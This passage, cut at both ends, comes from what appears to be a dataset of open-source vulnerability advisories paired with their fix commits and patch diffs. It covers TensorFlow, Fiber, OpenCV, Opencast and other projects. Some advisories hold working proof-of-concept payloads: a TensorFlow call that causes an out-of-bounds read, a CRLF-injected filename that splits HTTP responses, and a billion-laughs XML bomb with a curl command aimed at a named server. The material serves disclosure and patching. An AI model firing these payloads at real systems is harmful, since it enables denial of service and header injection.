(filter_input_depth_value == 0)\\n+      return errors::InvalidArgument(\"Depth of filter must not be 0\");\\n     if (input_depth_value % filter_input_depth_value != 0)\\n       return errors::InvalidArgument(\\n           \"Depth of input (\", input_depth_value,\\n@@ -681,6 +683,8 @@ Status Conv2DShapeImpl(shape_inference::InferenceContext* c,\\n       int64_t num_groups = input_depth_value \/ filter_input_depth_value;\\n       if (c->ValueKnown(output_depth_dim)) {\\n         int64_t output_depth_value = c->Value(output_depth_dim);\\n+        if (num_groups == 0)\\n+          return errors::InvalidArgument(\"Number of groups must not be 0\");\\n         if (output_depth_value % num_groups != 0)\\n           return errors::InvalidArgument(\\n               \"Depth of output (\", output_depth_value,\\n@@ -816,6 +820,8 @@ Status Conv3DShape(shape_inference::InferenceContext* c) {\\n   if (c->ValueKnown(input_depth_dim) && c->ValueKnown(filter_input_depth_dim)) {\\n     int64_t input_depth_value = c->Value(input_depth_dim),\\n             filter_input_depth_value = c->Value(filter_input_depth_dim);\\n+    if (filter_input_depth_value == 0)\\n+      return errors::InvalidArgument(\"Depth of filter must not be 0\");\\n     if (input_depth_value % filter_input_depth_value != 0)\\n       return errors::InvalidArgument(\\n           \"Depth of input (\", input_depth_value,\\n@@ -825,6 +831,8 @@ Status Conv3DShape(shape_inference::InferenceContext* c) {\\n       int64_t num_groups = input_depth_value \/ filter_input_depth_value;\\n       if (c->ValueKnown(output_depth_dim)) {\\n         int64_t output_depth_value = c->Value(output_depth_dim);\\n+        if (num_groups == 0)\\n+          return errors::InvalidArgument(\"Number of groups must not be 0\");\\n         if (output_depth_value % num_groups != 0)\\n           return errors::InvalidArgument(\\n               \"Depth of output (\", output_depth_value,\\n@@ -2456,6 +2464,9 @@ Status SparseReduceShapeFn(InferenceContext* c) {\\n \\n     int64_t ndims = shape_vec.size();\\n     absl::flat_hash_set<int64> axes;\\n+    if (ndims == 0)\\n+      return errors::InvalidArgument(\\n+          \"Number of dims in shape tensor must not be 0\");\\n     for (int i = 0; i < axes_vec.size(); i++) {\\n       axes.insert((axes_vec(i) + ndims) % ndims);\\n     }'}}","message_norm":"prevent division by 0 in common shape functions.\n\npiperorigin-revid: 387712197\nchange-id: id25c7460e35b68aeeeac23b9a88e455b443ee149","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('387712197', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/framework\/common_shape_fns.cc'])","num_files":1.0},{"index":1357,"vuln_id":"GHSA-9c8h-vvrj-w2p8","cwe_id":"{'CWE-125'}","score":7.1,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a2b743f6017d7b97af1fe49087ae15f0ac634373'}","dataset":"osv","summary":"Heap OOB in `RaggedGather` ### Impact\nIf the arguments to `tf.raw_ops.RaggedGather` don't determine a valid ragged tensor code can trigger a read from outside of bounds of heap allocated buffers.\n                                                                                                                                                                                                                                                                                          \n```python\nimport tensorflow as tf\n\ntf.raw_ops.RaggedGather(\n  params_nested_splits = [0,0,0],\n  params_dense_values = [1,1],\n  indices = [0,0,9,0,0],\n  OUTPUT_RAGGED_RANK=0)\n```\n\nIn debug mode, the same code triggers a `CHECK` failure.\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8d72537c6abf5a44103b57b9c2e22c14f5f49698\/tensorflow\/core\/kernels\/ragged_gather_op.cc#L70) directly reads the first dimension of a tensor shape before checking that said tensor has rank of at least 1 (i.e., it is not a scalar). Furthermore, the implementation does not check that the list given by `params_nested_splits` is not an empty list of tensors.\n\n### Patches\nWe have patched the issue in GitHub commit [a2b743f6017d7b97af1fe49087ae15f0ac634373](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a2b743f6017d7b97af1fe49087ae15f0ac634373).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a2b743f6017d7b97af1fe49087ae15f0ac634373","commit_sha":"a2b743f6017d7b97af1fe49087ae15f0ac634373","patch":"SINGLE","chain_ord":"['a2b743f6017d7b97af1fe49087ae15f0ac634373']","before_first_fix_commit":"{'4979e3b104cede96958ea88be5ce5fc584949340'}","last_fix_commit":"a2b743f6017d7b97af1fe49087ae15f0ac634373","chain_ord_pos":1.0,"commit_datetime":"08\/03\/2021, 02:05:27","message":"Fix heap OOB in `tf.raw_ops.RaggedGather`\n\nPiperOrigin-RevId: 388355464\nChange-Id: If14d96231d1cd7aad7c4d1c22c1bab1576b75717","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 7, 'deletions': 1, 'total': 8}","files":"{'tensorflow\/core\/kernels\/ragged_gather_op.cc': {'additions': 7, 'deletions': 1, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/a2b743f6017d7b97af1fe49087ae15f0ac634373\/tensorflow%2Fcore%2Fkernels%2Fragged_gather_op.cc', 'patch': '@@ -58,15 +58,21 @@ class RaggedGatherOpBase : public OpKernel {\\n \\n   void Compute(OpKernelContext* context) override {\\n     \/\/ Get the input Tensors.\\n+\\n     OpInputList params_nested_splits_in;\\n     OP_REQUIRES_OK(context, context->input_list(\"params_nested_splits\",\\n                                                 &params_nested_splits_in));\\n+    OP_REQUIRES(\\n+        context, params_nested_splits_in.size() > 0,\\n+        errors::InvalidArgument(\"params_nested_splits must be non empty\"));\\n+\\n     const Tensor& params_dense_values_in =\\n         context->input(params_nested_splits_in.size());\\n     const Tensor& indices_in =\\n         context->input(params_nested_splits_in.size() + 1);\\n \\n-    DCHECK_GT(params_nested_splits_in.size(), 0);  \/\/ Enforced by REGISTER_OP.\\n+    OP_REQUIRES(context, params_nested_splits_in[0].dims() > 0,\\n+                errors::InvalidArgument(\"Split tensors must not be scalars\"));\\n     SPLITS_TYPE num_params = params_nested_splits_in[0].dim_size(0) - 1;\\n     OP_REQUIRES_OK(context, ValidateIndices(indices_in, num_params));'}}","message_norm":"fix heap oob in `tf.raw_ops.raggedgather`\n\npiperorigin-revid: 388355464\nchange-id: if14d96231d1cd7aad7c4d1c22c1bab1576b75717","language":"en","entities":"[('fix', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('388355464', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/ragged_gather_op.cc'])","num_files":1.0},{"index":1359,"vuln_id":"GHSA-9cq5-xgg4-x477","cwe_id":"{'CWE-89'}","score":6.7,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/2b34e267e4186125f99bfa420140634ad45801fb'}","dataset":"osv","summary":"SQL Injection in showdoc Showdoc verions 2.10.2 and prior is vulnerable to SQL injection. A patch is available in the `master` branch of the repository.","published_date":"2022-01-27","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/2b34e267e4186125f99bfa420140634ad45801fb","commit_sha":"2b34e267e4186125f99bfa420140634ad45801fb","patch":"SINGLE","chain_ord":"['2b34e267e4186125f99bfa420140634ad45801fb']","before_first_fix_commit":"{'409c8a1208bbb847046a9496303192980f2e6219'}","last_fix_commit":"2b34e267e4186125f99bfa420140634ad45801fb","chain_ord_pos":1.0,"commit_datetime":"01\/25\/2022, 12:34:52","message":"bug","author":"star7th","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'server\/Application\/Api\/Controller\/AdminUserController.class.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/2b34e267e4186125f99bfa420140634ad45801fb\/server%2FApplication%2FApi%2FController%2FAdminUserController.class.php', 'patch': '@@ -76,7 +76,7 @@ public function addUser(){\\n         $this->checkAdmin();\\n         $username = I(\"post.username\");\\n         $password = I(\"post.password\");\\n-        $uid = I(\"post.uid\");\\n+        $uid = I(\"post.uid\/d\");\\n         $name = I(\"post.name\");\\n         if(!$username){\\n             $this->sendError(10101,\\'\u7528\u6237\u540d\u4e0d\u5141\u8bb8\u4e3a\u7a7a\\');'}}","message_norm":"bug","language":"id","entities":"[('bug', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Controller\/AdminUserController.class.php'])","num_files":1.0},{"index":1362,"vuln_id":"GHSA-9cx9-x2gp-9qvh","cwe_id":"{'CWE-74', 'CWE-93'}","score":4.2,"chain":"{'https:\/\/github.com\/gofiber\/fiber\/pull\/579\/commits\/f698b5d5066cfe594102ae252cd58a1fe57cf56f'}","dataset":"osv","summary":"CRLF vulnerability in Fiber ### Impact\nThe filename that is given in [c.Attachment()](https:\/\/docs.gofiber.io\/ctx#attachment) is not escaped, and therefore vulnerable for a CRLF injection attack. I.e. an attacker could upload a custom filename and then give the link to the victim. With this filename, the attacker can change the name of the downloaded file, redirect to another site, change the authorization header, etc.\n\n### Steps to reproduce\n```go\npackage main\n\nimport \"github.com\/gofiber\/fiber\"\n\nconst badFileName = \"another secret document.pdf\\\"\\r\\nLocation: google.com\\r\\nAuthorization: \\\"example_of_session_fixation\"\n\nfunc splitTheResponse(c *fiber.Ctx) {\n\tc.Attachment(badFileName)\n}\n\nfunc main() {\n\tapp := fiber.New()\n\tapp.Get(\"\/attack\", splitTheResponse)\n\tapp.Listen(\"127.0.0.1:8080\")\n}\n```\n```\nHTTP\/1.1 200 OK\nDate: Fri, 10 Jul 2020 19:47:04 GMT\nContent-Type: application\/octet-stream\nContent-Length: 0\nContent-Disposition: attachment; filename=\"another secret document.pdf\"\nLocation: google.com\nAuthorization: \"example_of_session_fixation\"\n```\n\n### Patches\nThis issue has been patched in `v1.12.6` with commit [579](https:\/\/github.com\/gofiber\/fiber\/pull\/579\/commits\/f698b5d5066cfe594102ae252cd58a1fe57cf56f) escaping the filename by default.\n\n### Workarounds\nYou could of course serialize the input yourself before passing it to `ctx.Attachment()`, this is actually a good practice by default. But in case you forget, we got you covered \ud83d\udc4d \n\n### References\nA CRLF injection attack is one of several types of injection attacks. It can be used to escalate to more malicious attacks such as Cross-site Scripting (XSS), page injection, web cache poisoning, cache-based defacement, and more. A CRLF injection vulnerability exists if an attacker can inject the CRLF characters into a web application, for example using a user input form or an HTTP request, [see acunetix](https:\/\/www.acunetix.com\/websitesecurity\/crlf-injection\/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [gofiber\/fiber](https:\/\/github.com\/gofiber\/fiber)\n* Join us on [Discord](https:\/\/gofiber.io\/discord)","published_date":"2021-06-29","chain_len":1,"project":"https:\/\/github.com\/gofiber\/fiber","commit_href":"https:\/\/github.com\/gofiber\/fiber\/pull\/579\/commits\/f698b5d5066cfe594102ae252cd58a1fe57cf56f","commit_sha":"f698b5d5066cfe594102ae252cd58a1fe57cf56f","patch":"SINGLE","chain_ord":"['f698b5d5066cfe594102ae252cd58a1fe57cf56f']","before_first_fix_commit":"{'fc5d2d7e6690ba74ad01ba0cd80e853ad451d153'}","last_fix_commit":"f698b5d5066cfe594102ae252cd58a1fe57cf56f","chain_ord_pos":1.0,"commit_datetime":"07\/10\/2020, 20:25:10","message":"\ud83d\udc1b Escape fname","author":"Fenny","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'ctx.go': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/gofiber\/fiber\/raw\/f698b5d5066cfe594102ae252cd58a1fe57cf56f\/ctx.go', 'patch': '@@ -196,7 +196,7 @@ func (ctx *Ctx) Attachment(filename ...string) {\\n \\tif len(filename) > 0 {\\n \\t\\tfname := filepath.Base(filename[0])\\n \\t\\tctx.Type(filepath.Ext(fname))\\n-\\t\\tctx.Set(HeaderContentDisposition, `attachment; filename=\"`+fname+`\"`)\\n+\\t\\tctx.Set(HeaderContentDisposition, `attachment; filename=\"`+url.QueryEscape(fname)+`\"`)\\n \\t\\treturn\\n \\t}\\n \\tctx.Set(HeaderContentDisposition, \"attachment\")'}}","message_norm":"\ud83d\udc1b escape fname","language":"es","entities":"[('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['ctx.go'])","num_files":1.0},{"index":1368,"vuln_id":"GHSA-9g3v-j3cr-6fc6","cwe_id":"{'CWE-79'}","score":6.8,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/bda23bb1e66fd7ce42c75c69cf5eea4e80865c1c'}","dataset":"osv","summary":"Cross-site Scripting in snipe-it snipe-it is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","published_date":"2021-10-21","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/bda23bb1e66fd7ce42c75c69cf5eea4e80865c1c","commit_sha":"bda23bb1e66fd7ce42c75c69cf5eea4e80865c1c","patch":"SINGLE","chain_ord":"['bda23bb1e66fd7ce42c75c69cf5eea4e80865c1c']","before_first_fix_commit":"{'5d94b99035317cd23059c7af91ff5f38177f5968'}","last_fix_commit":"bda23bb1e66fd7ce42c75c69cf5eea4e80865c1c","chain_ord_pos":1.0,"commit_datetime":"10\/15\/2021, 16:50:52","message":"Fixes possible XSS on all-file-types export\n\nSigned-off-by: snipe <snipe@snipe.net>","author":"snipe","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'resources\/views\/partials\/bootstrap-table.blade.php': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/bda23bb1e66fd7ce42c75c69cf5eea4e80865c1c\/resources%2Fviews%2Fpartials%2Fbootstrap-table.blade.php', 'patch': '@@ -75,6 +75,10 @@ classes: \\'table table-responsive table-no-bordered\\',\\n                 export: \\'fa-download\\',\\n                 clearSearch: \\'fa-times\\'\\n             },\\n+            exportOptions: {\\n+                htmlContent: true,\\n+            },\\n+\\n             exportTypes: [\\'csv\\', \\'excel\\', \\'doc\\', \\'txt\\',\\'json\\', \\'xml\\', \\'pdf\\'],\\n             onLoadSuccess: function () {\\n                 $(\\'[data-toggle=\"tooltip\"]\\').tooltip(); \/\/ Needed to attach tooltips after ajax call'}}","message_norm":"fixes possible xss on all-file-types export\n\nsigned-off-by: snipe <snipe@snipe.net>","language":"en","entities":"[('xss', 'SECWORD', ''), ('snipe@snipe.net', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['resources\/views\/partials\/bootstrap-table.blade.php'])","num_files":1.0},{"index":1369,"vuln_id":"GHSA-9g8h-pjm4-q92p","cwe_id":"{'CWE-787'}","score":5.5,"chain":"{'https:\/\/github.com\/opencv\/opencv\/pull\/10566\/commits\/435a3e337bd9d4e11af61cf8b8afca067bf1a8aa'}","dataset":"osv","summary":"Out-of-bounds Write in OpenCV. In OpenCV 3.3.1 (corresponding with OpenCV-Python 3.3.1.11), a heap-based buffer overflow happens in cv::Jpeg2KDecoder::readComponent8u in modules\/imgcodecs\/src\/grfmt_jpeg2000.cpp when parsing a crafted image file.","published_date":"2021-10-12","chain_len":1,"project":"https:\/\/github.com\/opencv\/opencv","commit_href":"https:\/\/github.com\/opencv\/opencv\/pull\/10566\/commits\/435a3e337bd9d4e11af61cf8b8afca067bf1a8aa","commit_sha":"435a3e337bd9d4e11af61cf8b8afca067bf1a8aa","patch":"SINGLE","chain_ord":"['435a3e337bd9d4e11af61cf8b8afca067bf1a8aa']","before_first_fix_commit":"{'f34a0a874a029a6201df0acbf46eeeaab8686e4d'}","last_fix_commit":"435a3e337bd9d4e11af61cf8b8afca067bf1a8aa","chain_ord_pos":1.0,"commit_datetime":"01\/09\/2018, 14:36:57","message":"imgcodecs: add more Jasper checks for supported and tested cases","author":"Alexander Alekhin","comments":null,"stats":"{'additions': 39, 'deletions': 7, 'total': 46}","files":"{'modules\/imgcodecs\/src\/grfmt_jpeg2000.cpp': {'additions': 39, 'deletions': 7, 'changes': 46, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/opencv\/opencv\/raw\/435a3e337bd9d4e11af61cf8b8afca067bf1a8aa\/modules%2Fimgcodecs%2Fsrc%2Fgrfmt_jpeg2000.cpp', 'patch': '@@ -77,7 +77,8 @@ static JasperInitializer initialize_jasper;\\n \\n Jpeg2KDecoder::Jpeg2KDecoder()\\n {\\n-    m_signature = \\'\\\\0\\' + String() + \\'\\\\0\\' + String() + \\'\\\\0\\' + String(\"\\\\x0cjP  \\\\r\\\\n\\\\x87\\\\n\");\\n+    static const unsigned char signature_[12] = { 0, 0, 0, 0x0c, \\'j\\', \\'P\\', \\' \\', \\' \\', 13, 10, 0x87, 10};\\n+    m_signature = String((const char*)signature_, (const char*)signature_ + sizeof(signature_));\\n     m_stream = 0;\\n     m_image = 0;\\n }\\n@@ -121,6 +122,8 @@ bool  Jpeg2KDecoder::readHeader()\\n         jas_image_t* image = jas_image_decode( stream, -1, 0 );\\n         m_image = image;\\n         if( image ) {\\n+            CV_Assert(0 == (jas_image_tlx(image)) && \"not supported\");\\n+            CV_Assert(0 == (jas_image_tly(image)) && \"not supported\");\\n             m_width = jas_image_width( image );\\n             m_height = jas_image_height( image );\\n \\n@@ -130,14 +133,31 @@ bool  Jpeg2KDecoder::readHeader()\\n             for( int i = 0; i < numcmpts; i++ )\\n             {\\n                 int depth_i = jas_image_cmptprec( image, i );\\n+                CV_Assert(depth == 0 || depth == depth_i); \/\/ component data type mismatch\\n                 depth = MAX(depth, depth_i);\\n                 if( jas_image_cmpttype( image, i ) > 2 )\\n                     continue;\\n+                int sgnd = jas_image_cmptsgnd(image, i);\\n+                int xstart = jas_image_cmpttlx(image, i);\\n+                int xend = jas_image_cmptbrx(image, i);\\n+                int xstep = jas_image_cmpthstep(image, i);\\n+                int ystart = jas_image_cmpttly(image, i);\\n+                int yend = jas_image_cmptbry(image, i);\\n+                int ystep = jas_image_cmptvstep(image, i);\\n+                CV_Assert(sgnd == 0 && \"not supported\");\\n+                CV_Assert(xstart == 0 && \"not supported\");\\n+                CV_Assert(ystart == 0 && \"not supported\");\\n+                CV_Assert(xstep == 1 && \"not supported\");\\n+                CV_Assert(ystep == 1 && \"not supported\");\\n+                CV_Assert(xend == m_width);\\n+                CV_Assert(yend == m_height);\\n                 cntcmpts++;\\n             }\\n \\n             if( cntcmpts )\\n             {\\n+                CV_Assert(depth == 8 || depth == 16);\\n+                CV_Assert(cntcmpts == 1 || cntcmpts == 3);\\n                 m_type = CV_MAKETYPE(depth <= 8 ? CV_8U : CV_16U, cntcmpts > 1 ? 3 : 1);\\n                 result = true;\\n             }\\n@@ -150,9 +170,14 @@ bool  Jpeg2KDecoder::readHeader()\\n     return result;\\n }\\n \\n+static void Jpeg2KDecoder_close(Jpeg2KDecoder* ptr)\\n+{\\n+    ptr->close();\\n+}\\n \\n bool  Jpeg2KDecoder::readData( Mat& img )\\n {\\n+    Ptr<Jpeg2KDecoder> close_this(this, Jpeg2KDecoder_close);\\n     bool result = false;\\n     int color = img.channels() > 1;\\n     uchar* data = img.ptr();\\n@@ -204,11 +229,16 @@ bool  Jpeg2KDecoder::readData( Mat& img )\\n                     result = true;\\n                 }\\n                 else\\n-                    fprintf(stderr, \"JPEG 2000 LOADER ERROR: cannot convert colorspace\\\\n\");\\n+                {\\n+                    jas_cmprof_destroy(clrprof);\\n+                    CV_Error(Error::StsError, \"JPEG 2000 LOADER ERROR: cannot convert colorspace\");\\n+                }\\n                 jas_cmprof_destroy( clrprof );\\n             }\\n             else\\n-                fprintf(stderr, \"JPEG 2000 LOADER ERROR: unable to create colorspace\\\\n\");\\n+            {\\n+                CV_Error(Error::StsError, \"JPEG 2000 LOADER ERROR: unable to create colorspace\");\\n+            }\\n         }\\n         else\\n             result = true;\\n@@ -257,8 +287,8 @@ bool  Jpeg2KDecoder::readData( Mat& img )\\n                                 result = readComponent16u( ((unsigned short *)data) + i, buffer, validateToInt(step \/ 2), cmptlut[i], maxval, offset, ncmpts );\\n                             if( !result )\\n                             {\\n-                                i = ncmpts;\\n-                                result = false;\\n+                                jas_matrix_destroy( buffer );\\n+                                CV_Error(Error::StsError, \"JPEG2000 LOADER ERROR: failed to read component\");\\n                             }\\n                         }\\n                         jas_matrix_destroy( buffer );\\n@@ -267,10 +297,12 @@ bool  Jpeg2KDecoder::readData( Mat& img )\\n             }\\n         }\\n         else\\n-            fprintf(stderr, \"JPEG2000 LOADER ERROR: colorspace conversion failed\\\\n\" );\\n+        {\\n+            CV_Error(Error::StsError, \"JPEG2000 LOADER ERROR: colorspace conversion failed\");\\n+        }\\n     }\\n \\n-    close();\\n+    CV_Assert(result == true);\\n \\n #ifndef _WIN32\\n     if (!clr.empty())'}}","message_norm":"imgcodecs: add more jasper checks for supported and tested cases","language":"en","entities":"[('add', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/imgcodecs\/src\/grfmt_jpeg2000.cpp'])","num_files":1.0},{"index":1370,"vuln_id":"GHSA-9g9w-hmvj-5h57","cwe_id":"{'CWE-471'}","score":0.0,"chain":"{'https:\/\/github.com\/jonschlinkert\/merge-deep\/commit\/2c33634da7129a5aefcc262d2fec2e72224404e5'}","dataset":"osv","summary":"Prototype Pollution in merge-deep Versions of `merge-deep` before 3.0.1 are vulnerable to prototype pollution via merging functions.\n\n\n## Recommendation\n\nUpdate to version 3.0.1 or later.","published_date":"2018-07-26","chain_len":1,"project":"https:\/\/github.com\/jonschlinkert\/merge-deep","commit_href":"https:\/\/github.com\/jonschlinkert\/merge-deep\/commit\/2c33634da7129a5aefcc262d2fec2e72224404e5","commit_sha":"2c33634da7129a5aefcc262d2fec2e72224404e5","patch":"SINGLE","chain_ord":"['2c33634da7129a5aefcc262d2fec2e72224404e5']","before_first_fix_commit":"{'7be7e50163dc4ef467ace5371186a77028a66cc9'}","last_fix_commit":"2c33634da7129a5aefcc262d2fec2e72224404e5","chain_ord_pos":1.0,"commit_datetime":"02\/07\/2018, 16:43:20","message":"exclude __proto__","author":"doowb","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jonschlinkert\/merge-deep\/raw\/2c33634da7129a5aefcc262d2fec2e72224404e5\/index.js', 'patch': \"@@ -30,7 +30,7 @@ module.exports = function mergeDeep(orig, objects) {\\n \\n function merge(target, obj) {\\n   for (var key in obj) {\\n-    if (!hasOwn(obj, key)) {\\n+    if (key === '__proto__' || !hasOwn(obj, key)) {\\n       continue;\\n     }\"}}","message_norm":"exclude __proto__","language":"pt","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":1374,"vuln_id":"GHSA-9gwx-9cwp-5c2m","cwe_id":"{'CWE-776'}","score":8.1,"chain":"{'https:\/\/github.com\/opencast\/opencast\/commit\/8ae27da5a6f658011a5741b3210e715b0dc6213e', 'https:\/\/github.com\/opencast\/opencast\/commit\/16b0d641713fe31b8518fcf14fc5e4e815d81206'}","dataset":"osv","summary":"Billion laughs attack (XML bomb) ### Impact\n\nOpencast is vulnerable to the [Billion laughs attack](https:\/\/en.wikipedia.org\/wiki\/Billion_laughs_attack)  which allows an attacker to easily execute a (seemingly permanent) denial of service attack, essentially taking down Opencast using a single HTTP request.\n\nConsider an XML file (`createMediaPackage.xml`) like this:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE lolz [\n <!ENTITY lol \"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum. \">\n <!ELEMENT title (#PCDATA)>\n <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n]>\n<mediapackage xmlns=\"http:\/\/mediapackage.opencastproject.org\" id=\"d162d5b2-b54f-4400-a268-ee6565b0e6e7\" start=\"2020-01-23T23:08:37Z\">\n  <title>&lol5;<\/title>\n  <media\/>\n  <metadata\/>\n  <attachments\/>\n  <publications\/>\n<\/mediapackage>\n```\n\nThrowing this at Opencast will cause Opencast to parse the XML and expand the Lorem Ipsum about 100\u00a0000 times, instantly consuming a huge amount of memory:\n\n```sh\ncurl -i -u admin:opencast https:\/\/develop.opencast.org\/ingestdownload\/ingestdownload \\\n  -F 'mediapackage=<createMediaPackage.xml' \\\n  -F sourceFlavors=\"\" \\\n  -F sourceTags=\"\" \\\n  -F deleteExternal=\"\" \\\n  -F tagsAndFlavor='' \\\n  -o out.xml\n```\n\nAdditional notes:\n\n- You can likely use other endpoints accepting XML (this was just the first one I tried) and depending on how much memory you want to consume, you might want to enlarge the lorem ipsum text.\n- Opencast's XML parser does limit the expansion to 100\u00a0000 times, already limiting the attack. Nevertheless, this can already harm the system. \n- To exploit this, users need to have ingest privileges, limiting the group of potential attackers\n\n### Patches\n\nThe problem has been fixed in Opencast 9.6. Older versions of Opencast are not patched sue to the extent of this patch.\n\n### Workarounds\n\nThere is no known workaround for this issue.\n\n### References\n\n- [Billion laughs attack explained](https:\/\/en.wikipedia.org\/wiki\/Billion_laughs_attack)\n- For technical details, take a look at the patch fixing the issue: https:\/\/github.com\/opencast\/opencast\/commit\/_________\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [our issue tracker](https:\/\/github.com\/opencast\/opencast\/issues)\n- Email us at [security@opencast.org](mailto:security@opencast.org)","published_date":"2021-06-17","chain_len":2,"project":"https:\/\/github.com\/opencast\/opencast","commit_href":"https:\/\/github.com\/opencast\/opencast\/commit\/8ae27da5a6f658011a5741b3210e715b0dc6213e","commit_sha":"8ae27da5a6f658011a5741b3210e715b0dc6213e","patch":"MULTI","chain_ord":"['16b0d641713fe31b8518fcf14fc5e4e815d81206', '8ae27da5a6f658011a5741b3210e715b0dc6213e']","before_first_fix_commit":"{'27f401f37e92564d5a89ef71ab6a5aa6c59ee6fc'}","last_fix_commit":"8ae27da5a6f658011a5741b3210e715b0dc6213e","chain_ord_pos":2.0,"commit_datetime":"06\/15\/2021, 10:36:31","message":"Clarifies debug options in setenv file (#2735)\n\nCo-authored-by: Lars Kiesow <lkiesow@uos.de>","author":"Maximiliano Lira Del Canto","comments":null,"stats":"{'additions': 5, 'deletions': 1, 'total': 6}","files":"{'assemblies\/resources\/bin\/setenv': {'additions': 5, 'deletions': 1, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/opencast\/opencast\/raw\/8ae27da5a6f658011a5741b3210e715b0dc6213e\/assemblies%2Fresources%2Fbin%2Fsetenv', 'patch': '@@ -31,8 +31,12 @@\\n # export KARAF_BASE        # Karaf base folder\\n # export KARAF_ETC         # Karaf etc  folder\\n # export KARAF_OPTS        # Additional Karaf options\\n-# export KARAF_DEBUG       # Enable debug mode\\n # export KARAF_REDIRECT    # Enable\/set the std\/err redirection when using bin\/start\\n+#\\n+# Debug options\\n+# export KARAF_DEBUG       # Enable debug mode\\n+# export JAVA_DEBUG_PORT   # Set debug port (defaults to 5005)\\n+\\n \\n export EXTRA_JAVA_OPTS=\"${EXTRA_JAVA_OPTS} -Dorg.eclipse.jetty.server.Request.maxFormContentSize=1500000 -Dfile.encoding=UTF-8\"\\n export JAVA_MAX_MEM=\"${JAVA_MAX_MEM:-1G}\"'}}","message_norm":"clarifies debug options in setenv file (#2735)\n\nco-authored-by: lars kiesow <lkiesow@uos.de>","language":"en","entities":"[('#2735', 'ISSUE', ''), ('lkiesow@uos.de', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['assemblies\/resources\/bin\/setenv'])","num_files":1.0},{"index":1383,"vuln_id":"GHSA-9hr3-j9mc-xmq2","cwe_id":"{'CWE-29', 'CWE-22'}","score":6.9,"chain":"{'https:\/\/github.com\/alibaba\/one-java-agent\/pull\/29\/commits\/359603b63fc6c59d8b57e061c171954bab3433bf', 'https:\/\/github.com\/alibaba\/one-java-agent\/pull\/29\/commits\/b5b437f9f4c8cbfe7bdbe266e975a4bd513c13fe'}","dataset":"osv","summary":"Path Traversal in com.alibaba.oneagent:one-java-agent-plugin All versions of package `com.alibaba.oneagent:one-java-agent-plugin` are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip) using a specially crafted archive that holds directory traversal filenames (e.g. 